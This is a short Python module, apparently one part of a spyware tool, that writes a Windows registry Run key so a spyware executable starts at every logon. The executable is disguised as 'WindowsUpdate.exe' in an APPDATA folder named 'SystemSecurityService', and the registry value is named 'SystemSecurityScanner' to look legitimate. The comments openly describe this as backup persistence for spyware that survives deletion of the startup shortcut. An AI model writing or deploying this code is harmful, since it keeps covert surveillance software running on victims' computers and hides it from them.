"""
Auto-Run Function 6: Spyware Persistence via Registry
Adds registry Run key for backup persistence (runs even if startup shortcut is deleted)
"""

import os
import winreg

def add_spyware_registry():
    """
    Add spyware to registry Run key for persistent execution
    Returns: True if successful, False otherwise
    """
    print("[Spyware] Function 6: Adding spyware to registry...")
    
    try:
        # Get spyware executable path
        appdata = os.getenv('APPDATA')
        spyware_exe = os.path.join(appdata, "SystemSecurityService", "WindowsUpdate.exe")
        
        # Open registry key for auto-run
        key_path = r'Software\Microsoft\Windows\CurrentVersion\Run'
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)
        
        # Add spyware with legitimate-looking name
        winreg.SetValueEx(key, 'SystemSecurityScanner', 0, winreg.REG_SZ, spyware_exe)
        winreg.CloseKey(key)
        
        print(f"[Spyware] Added registry key: HKCU\\{key_path}\\SystemSecurityScanner")
        print(f"[Spyware] Spyware will auto-run on every system boot")
        return True
    except Exception as e:
        print(f"[Spyware] Error adding registry key: {e}")
        return False
